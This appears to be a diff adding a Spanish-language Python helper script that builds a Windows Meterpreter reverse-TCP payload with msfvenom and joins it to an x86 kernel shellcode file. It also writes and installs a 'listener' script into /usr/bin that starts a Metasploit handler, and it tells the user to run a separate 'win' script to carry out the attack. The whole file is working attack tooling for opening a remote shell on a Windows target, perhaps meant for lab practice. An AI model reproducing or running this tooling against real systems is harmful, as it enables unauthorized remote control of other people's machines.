@@ -1,0 +1,39 @@
+#!/usr/bin/env python3
+
+try:	
+	import os
+	import time
+	from colorama import Fore, Style
+	import pyperclip 
+	
+	
+	print()
+	IP_local = input(Fore.CYAN + Style.BRIGHT + "[+] Introduce tu IP local: " + Style.RESET_ALL)
+	puerto = input(Fore.CYAN + Style.BRIGHT + "[+] Introduce el puerto local: " + Style.RESET_ALL)
+	time.sleep(0.5)
+	print()
+	print(Fore.YELLOW + Style.BRIGHT + "[i] Creando payload..." + Style.RESET_ALL)
+	
+	msfvenom = f"msfvenom -p windows/meterpreter/reverse_tcp -f raw -o meterpreter.bin EXITFUNC=thread LHOST={IP_local} LPORT={puerto} 2>/dev/null"
+	exportación = "/usr/bin/cat sc_x86_kernel.bin meterpreter.bin > meter.bin"
+	os.system(msfvenom)
+	time.sleep(1)
+	os.system(exportación)
+	print()
+	print(Fore.CYAN + "[+] Todo listo! Abre una nueva terminal y ejecuta el script " + Fore.YELLOW + Style.BRIGHT + "listener " + Style.RESET_ALL + Fore.CYAN + "para poner Metasploit en escucha.")
+	print()
+	print(Fore.CYAN + "Luego, ejecuta el script " + Fore.YELLOW + Style.BRIGHT + "win " + Style.RESET_ALL + Fore.CYAN + "para realizar el ataque")
+
+
+except KeyboardInterrupt:
+	print()
+	print()
+	print(Fore.RED + Style.BRIGHT + "[!] Saliendo..." + Style.RESET_ALL)
+
+with open("listener", "w") as archivo:
+	archivo.write("#!/bin/bash\n")
+	archivo.write("echo -e [+] Iniciando el listener, esto puede tardar unos segundos...\n")
+	archivo.write(f"sudo msfconsole -q -x 'use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {IP_local}; set EXITFUNC thread; set lport {puerto}; exploit'")
+
+os.system("chmod +x listener")
+os.system("cp listener /usr/bin")
